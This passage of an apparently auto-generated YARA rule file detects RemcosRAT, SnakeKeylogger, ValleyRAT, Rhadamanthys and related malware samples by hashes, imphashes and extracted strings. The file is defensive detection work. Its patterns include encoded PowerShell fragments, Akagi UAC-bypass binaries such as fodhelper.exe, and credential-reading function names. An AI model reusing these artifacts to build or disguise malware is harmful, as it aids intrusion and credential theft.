      $s11 = "QB6AGEAdABpAG8AbgAgAGYAYQBpAGwAZQBkADoAIAAkACgAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkAIgAgAC0ARgBvAHIAZQBnAHIAb" ascii /* score: '11.00'*/
      $s12 = "wBuAEEAZABkAHIAZQBzAHMALAAgAFsAVAB5AHAAZQBbAF0AXQAkAEkAbgBwAHUAdABQAGEAcgBhAG0AZQB0AGUAcgBzACwAIABbAFQAeQBwAGUAXQAkAE8AdQB0AHAAd" ascii /* score: '11.00'*/
      $s13 = "QBuAGMAdABpAG8AbgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB2AHQAY" ascii /* score: '11.00'*/
      $s14 = "QBvAG4AQQBkAGQAcgBlAHMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0AL" ascii /* score: '11.00'*/
      $s15 = "QBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkAKAAkAGEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAd" ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x6157 or uint16(0) == 0x6c50 ) and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_37 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash5 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "&GetFieldBypassCctor&SetFieldBypassCctor@" fullword ascii /* score: '20.00'*/
      $s2 = "\"UncheckedGetField\"UncheckedSetField8UncheckedSetFieldBypassCctor&get_IsFieldInitOnly" fullword ascii /* score: '20.00'*/
      $s3 = ".ExecutionAndPublication@" fullword ascii /* score: '19.00'*/
      $s4 = "ChangeType operation is not supported" fullword wide /* score: '17.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<System.Reflection.Runtime.MethodInfos.RuntimeMethodInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<System.Reflection.EventInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<System.Reflection.Runtime.MethodInfos.RuntimeMethodInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<System.Reflection.EventInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s9 = "WIN32_FIND_DATA:TIME_DYNAMIC_ZONE_INFORMATION PROCESSOR_NUMBER" fullword ascii /* score: '15.00'*/
      $s10 = "BGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '15.00'*/
      $s11 = "System.Collections.Generic.IEnumerable<System.Reflection.PropertyInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s12 = "System.Collections.Generic.IEnumerator<System.Reflection.CustomAttributeData>.get_Current@" fullword ascii /* score: '15.00'*/
      $s13 = "System.Collections.Generic.IEnumerator<System.Reflection.PropertyInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s14 = "System.Collections.Generic.IEnumerable<System.Reflection.MethodInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IEnumerable<System.Reflection.CustomAttributeData>.GetEnumerator@" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4f7cc3de_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_38 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4f7cc3de.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_edaba79c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4f7cc3de696e7c5e88e25625fe77f08c6472ff0581d4cc03c6c0c3204f7be784"
      hash2 = "edaba79c3d43a416a86003f336d879ed3a513aa24dd401340584615647ed6da2"
   strings:
      $s1 = "users.txt" fullword wide /* score: '22.00'*/
      $s2 = "readlogindata" fullword ascii /* score: '19.00'*/
      $s3 = "get_UsersData" fullword ascii /* score: '17.00'*/
      $s4 = "get_download__1_1" fullword ascii /* score: '15.00'*/
      $s5 = "get_download__1_" fullword ascii /* score: '15.00'*/
      $s6 = "Please select another password ! It's already taken" fullword wide /* score: '15.00'*/
      $s7 = "items.txt" fullword wide /* score: '14.00'*/
      $s8 = "usersDL" fullword ascii /* score: '12.00'*/
      $s9 = "get_d1dd6ce6a7c22b060352c18cbe9581f3__borders_and_frames_stationary_items" fullword ascii /* score: '12.00'*/
      $s10 = "usersData" fullword ascii /* score: '12.00'*/
      $s11 = "addUsersIntoList" fullword ascii /* score: '12.00'*/
      $s12 = "set_UsersData" fullword ascii /* score: '12.00'*/
      $s13 = "Users Data not Loaded succesfully !" fullword wide /* score: '12.00'*/
      $s14 = "Enter your password (Only 8 Characters): " fullword wide /* score: '12.00'*/
      $s15 = "Enter your password : " fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imphash__SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imph_39 {
   meta:
      description = "_subset_batch - from files SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash).exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_0f1b3601.exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_bdca7eab.exe, VenomRAT(signature)_dcaf48c1f10b0efa0a4472200f3850ed(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "91c48122fad932eb549ca8cf2734a73b21a5b4b2aefe3d86e675586d2ee091b0"
      hash2 = "0f1b3601c91c1a1de03108c26a491f567ad3c0603313e5b5b0f2a530984ccc92"
      hash3 = "bdca7eabc43d49ace207da10ffafcebbcd4fb26e4a779339878386953b5da6d3"
      hash4 = "94ab9f0a1b7cdd5287aef8ac76e6071a0f25884c15c71079c40c5be355ce3a9e"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s4 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s5 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s6 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s7 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s8 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s9 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s10 = "Failed to initialize security descriptor for temporary directory!" fullword ascii /* score: '20.00'*/
      $s11 = "%s%c%s.exe" fullword ascii /* score: '20.00'*/
      $s12 = "Failed to execute script '%ls' due to unhandled exception: %ls" fullword wide /* score: '20.00'*/
      $s13 = "LOADER: failed to set the TMP environment variable." fullword wide /* score: '19.00'*/
      $s14 = "Failed to create child process!" fullword wide /* score: '18.00'*/
      $s15 = "Failed to extract %s: decompression resulted in return code %d!" fullword ascii /* score: '15.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__aa4eb9fdeff2aa13951b349b94f4f6ef_imphash__ValleyRAT_signature__ce09579c3721886d9041e964bc6aebf4_imphas_40 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_aa4eb9fdeff2aa13951b349b94f4f6ef(imphash).exe, ValleyRAT(signature)_ce09579c3721886d9041e964bc6aebf4(imphash).exe, ValleyRAT(signature)_ce09579c3721886d9041e964bc6aebf4(imphash)_265735e5.exe, ValleyRAT(signature)_ce09579c3721886d9041e964bc6aebf4(imphash)_9ef8d59c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6e077a0d195558a6dbe2f78349db94ccddff1513a92288b9a1408256267560e7"
      hash2 = "e92228707cbc2a07b773bd2bf2c68f90c3df82fa35d9e439aaa30c4857546e1c"
      hash3 = "265735e522bc53a016b41c94ce8e3386015022d9ade19e8a91b7ce4010f2ba4b"
      hash4 = "9ef8d59c6d415a64123ad4202416093b6a4b71b495e3754eae10efcaa5ce46fa"
   strings:
      $x1 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><a" ascii /* score: '50.00'*/
      $x2 = "iscsiexe.dll" fullword wide /* reversed goodware string 'lld.exeiscsi' */ /* score: '33.00'*/
      $s3 = "\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"fals" ascii /* score: '26.00'*/
      $s4 = "wow64log.dll" fullword wide /* score: '25.00'*/
      $s5 = "computerdefaults.exe" fullword wide /* score: '25.00'*/
      $s6 = "ency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" publicKe" ascii /* score: '24.00'*/
      $s7 = "BluetoothDiagnosticUtil.dll" fullword wide /* score: '23.00'*/
      $s8 = "yIdentity type=\"win32\" name=\"Akagi\" version=\"1.0.0.0\" processorArchitecture=\"*\"></assemblyIdentity><description>Akagi wa" ascii /* score: '22.00'*/
      $s9 = "fodhelper.exe" fullword wide /* score: '22.00'*/
      $s10 = "WSReset.exe" fullword wide /* score: '22.00'*/
      $s11 = "Akagi.exe" fullword wide /* score: '22.00'*/
      $s12 = "api-ms-win-core-kernel32-legacy-l1.DLL" fullword wide /* score: '20.00'*/
      $s13 = "ATL.dll" fullword wide /* score: '20.00'*/
      $s14 = ")explorer.exe" fullword wide /* score: '19.00'*/
      $s15 = "  2014 - 2023 Fraudware Scripting, Florian Roth" fullword wide /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__S_41 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash4 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash5 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s2 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.expandCgoFrames" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.mapassign_fast64ptr" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.typehash" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.mapassign_fast64" fullword ascii /* score: '13.00'*/
      $s7 = "fmt.getField" fullword ascii /* score: '12.00'*/
      $s8 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s9 = "sync/atomic.CompareAndSwapPointer" fullword ascii /* score: '11.00'*/
      $s10 = "reflect.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s11 = "sync/atomic.CompareAndSwapUintptr" fullword ascii /* score: '11.00'*/
      $s12 = "reflect.(*rtype).common" fullword ascii /* score: '11.00'*/
      $s13 = "internal/fmtsort.compare" fullword ascii /* score: '11.00'*/
      $s14 = "erroring" fullword ascii /* score: '11.00'*/
      $s15 = "runtime.stopTheWorldGC" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1140784c_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_42 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1140784c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_23679efa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1140784c476e403857dbda36c5091358e6ba70b140a0d3ce438abff8f705d79c"
      hash2 = "23679efa5468f8e0e11d24d4a2e6408f13c5982664fc3025c6e3c2e8b34a4660"
   strings:
      $s1 = "ExecuteArpCommand" fullword ascii /* score: '26.00'*/
      $s2 = "DNS flush command executed. Check command prompt for results." fullword wide /* score: '22.00'*/
      $s3 = "IP renewal command executed. This may take a moment to complete." fullword wide /* score: '22.00'*/
      $s4 = "Note: Full routing table display requires elevated privileges." fullword wide /* score: '19.00'*/
      $s5 = "Scan Completed: {0:yyyy-MM-dd HH:mm:ss}" fullword wide /* score: '13.00'*/
      $s6 = "This will attempt to renew IP configuration. Continue?" fullword wide /* score: '13.00'*/
      $s7 = "get_OpenPorts" fullword ascii /* score: '12.00'*/
      $s8 = "Error scanning network: {0}" fullword wide /* score: '12.00'*/
      $s9 = "ScanCommonPorts" fullword ascii /* score: '11.00'*/
      $s10 = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True" fullword wide /* score: '11.00'*/
      $s11 = "/c ipconfig /flushdns" fullword wide /* score: '11.00'*/
      $s12 = "/c ipconfig /release & ipconfig /renew" fullword wide /* score: '11.00'*/
      $s13 = "SmartNetworkAnalyzer.Forms.NetworkConfigForm.resources" fullword ascii /* score: '10.00'*/
      $s14 = "Ping failed: {0}" fullword wide /* score: '10.00'*/
      $s15 = "Scanning common ports..." fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a4_i_43 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash3 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash4 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "x<ReduceAlternation>g__RemoveRedundantEmptiesAndNothings|42_2d<ReduceAlternation>g__ExtractCommonPrefixText|42_3X<ReduceAlternat" ascii /* score: '22.00'*/
      $s2 = "DExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s3 = "ExecutionDomain" fullword ascii /* score: '16.00'*/
      $s4 = "4<FindPrefix>g__Process|1_0" fullword ascii /* score: '15.00'*/
      $s5 = "8get_IsVectorizationSupported&ComputeAnyByteState" fullword ascii /* score: '15.00'*/
      $s6 = "ion>g__ProcessOneOrMulti|42_4" fullword ascii /* score: '15.00'*/
      $s7 = "IdManager$FinalizationHelper\"WorkStealingQueue(QueueProcessingStage" fullword ascii /* score: '15.00'*/
      $s8 = "TLoader" fullword ascii /* score: '13.00'*/
      $s9 = "@get_RuntimeGenericTypeParameters2get_SyntheticConstructors@" fullword ascii /* score: '12.00'*/
      $s10 = "&GetComponentsHelper" fullword ascii /* score: '12.00'*/
      $s11 = "LTryGetFunctionPointerTypeForComponents@" fullword ascii /* score: '12.00'*/
      $s12 = "x<ReduceAlternation>g__RemoveRedundantEmptiesAndNothings|42_2d<ReduceAlternation>g__ExtractCommonPrefixText|42_3X<ReduceAlternat" ascii /* score: '11.00'*/
      $s13 = ",IRuntimeMethodCommon`1" fullword ascii /* score: '10.00'*/
      $s14 = ".TryGetUnicodeEquivalent" fullword ascii /* score: '9.00'*/
      $s15 = " GetMintermFromId" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__374c0585_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_44 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_374c0585.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_585f964a.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_af3c9677.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bb17aae7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "374c0585a847123b53c6a0882073830abf04829ecb038e0bdad00cf458bd16ee"
      hash2 = "585f964ab32e7e8b968f4d6f3c8395d757abc7bd22afc3ea04f31fd381fb4c5e"
      hash3 = "af3c9677ddb4f4989eefa3f4dbc7c2c61067adfde4203b106939e13def66ba22"
      hash4 = "bb17aae78c989184f3618223ea0e06d307fee6a6467ba61bb4b9e15ca42cf06c"
   strings:
      $s1 = "<GetTasksCompletedToday>b__19_0" fullword ascii /* score: '12.00'*/
      $s2 = "GetCompletedTasks" fullword ascii /* score: '12.00'*/
      $s3 = "GetCommonTasks" fullword ascii /* score: '12.00'*/
      $s4 = "GetTasksCompletedToday" fullword ascii /* score: '12.00'*/
      $s5 = "<GetCompletedTasks>b__10_0" fullword ascii /* score: '12.00'*/
      $s6 = "get_CompletedDate" fullword ascii /* score: '12.00'*/
      $s7 = "<GetCompletedTasks>b__10_1" fullword ascii /* score: '12.00'*/
      $s8 = "Daily Planner - Smart Task Manager" fullword wide /* score: '12.00'*/
      $s9 = "Settings - Daily Planner" fullword wide /* score: '12.00'*/
      $s10 = "Milk, bread, eggs, vegetables for the week" fullword wide /* score: '12.00'*/
      $s11 = "btnHealthTemplate" fullword wide /* score: '11.00'*/
      $s12 = "buttonTemplate_Click" fullword ascii /* score: '11.00'*/
      $s13 = "btnShoppingTemplate" fullword wide /* score: '11.00'*/
      $s14 = "btnWorkTemplate" fullword wide /* score: '11.00'*/
      $s15 = "groupBoxTemplates" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__45 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash2 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash3 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash4 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash5 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash6 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash7 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash8 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash9 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash10 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash11 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $s1 = "q*struct { lock runtime.mutex; newm runtime.muintptr; waiting bool; wake runtime.note; haveTemplateThread uint32 }" fullword ascii /* score: '25.00'*/
      $s2 = "2*struct { lock runtime.mutex; lockOwner *runtime.g; enabled bool; shutdown bool; headerWritten bool; footerWritten bool; shutdo" ascii /* score: '23.00'*/
      $s3 = "2*struct { lock runtime.mutex; lockOwner *runtime.g; enabled bool; shutdown bool; headerWritten bool; footerWritten bool; shutdo" ascii /* score: '23.00'*/
      $s4 = "type..eq.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; ru" ascii /* score: '20.00'*/
      $s5 = "ckTab runtime.traceStackTable; stringsLock runtime.mutex; strings map[string]uint64; stringSeq uint64; markWorkerLabels [3]uint6" ascii /* score: '18.00'*/
      $s6 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s7 = "e*struct { lock runtime.mutex; next int32; m map[int32]unsafe.Pointer; minv map[unsafe.Pointer]int32 }" fullword ascii /* score: '18.00'*/
      $s8 = "N*struct { lock runtime.mutex; free runtime.mSpanList; busy runtime.mSpanList }" fullword ascii /* score: '18.00'*/
      $s9 = "2*struct { runtime.mutex; runtime.persistentAlloc }" fullword ascii /* score: '18.00'*/
      $s10 = ":*struct { lock runtime.mutex; free [35]runtime.mSpanList }" fullword ascii /* score: '18.00'*/
      $s11 = "4; bufLock runtime.mutex; buf runtime.traceBufPtr }" fullword ascii /* score: '18.00'*/
      $s12 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s13 = "ntime.haveTemplateThread uint32 }" fullword ascii /* score: '17.00'*/
      $s14 = "runtime.(*gcSweepBuf).pop" fullword ascii /* score: '15.00'*/
      $s15 = "haveTemplateThread" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__9f4693fc0c511135129493f2161d1e86_imphash__SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a_46 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_9f4693fc0c511135129493f2161d1e86(imphash).exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_144c0630.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c0f5dd3c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "86073c2058e6ccd233b12878ac2b97da3fbf9a5e7f79ec959e0693237f7aba4b"
      hash2 = "144c0630ec23ef25922d5af40c7754cc00c7e35df7ec0faf1fba807e36401f1b"
      hash3 = "c0f5dd3cd5939bb1f1c392c49bd474bd5987c07010b2528f3fe29d8906bf0460"
   strings:
      $s1 = "Core.Infrastructure.Logging" fullword ascii /* score: '16.00'*/
      $s2 = "System.Collections.Generic.IEnumerable<TType>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s3 = "GetInfoScript" fullword ascii /* score: '15.00'*/
      $s4 = "GetWarningScript" fullword ascii /* score: '15.00'*/
      $s5 = "GetSuccessScript" fullword ascii /* score: '15.00'*/
      $s6 = "GetFatalScript" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<TType>.get_Current" fullword ascii /* score: '15.00'*/
      $s8 = "GetSpecByContentType" fullword ascii /* score: '14.00'*/
      $s9 = "<GetSpecByContentType>b__0" fullword ascii /* score: '14.00'*/
      $s10 = "StructureMap.Configuration.DSL.Expressions" fullword ascii /* score: '13.00'*/
      $s11 = "StructureMap.Pipeline" fullword ascii /* score: '13.00'*/
      $s12 = "StructureMap.Configuration.DSL" fullword ascii /* score: '13.00'*/
      $s13 = "BuildTemplate" fullword ascii /* score: '11.00'*/
      $s14 = "(http|https)://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)?" fullword wide /* score: '11.00'*/
      $s15 = "Attempting to add {0}" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fe60a7df_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_47 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fe60a7df.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b225beef.exe, Stealerium(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e0debd3d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fe60a7df5bc022b0e471bf083116a1657e8181a87f26727bee92ec7e8eb2fae8"
      hash2 = "b225beef2338636503b1d0e3f9d43ec35ff0e2d3b271904b4fcafe2c3bc48c01"
      hash3 = "e0debd3d856bc96dc136c9477707ad7da3288c6e57e7040ad7e904fb589f4ef5"
   strings:
      $s1 = "statistics.dat" fullword wide /* score: '14.00'*/
      $s2 = "highscores.dat" fullword wide /* score: '14.00'*/
      $s3 = "GetCompletionRate" fullword ascii /* score: '12.00'*/
      $s4 = "<GetAverageCompletionTime>b__32_0" fullword ascii /* score: '12.00'*/
      $s5 = "get_CompletionTime" fullword ascii /* score: '12.00'*/
      $s6 = "GetAverageCompletionTime" fullword ascii /* score: '12.00'*/
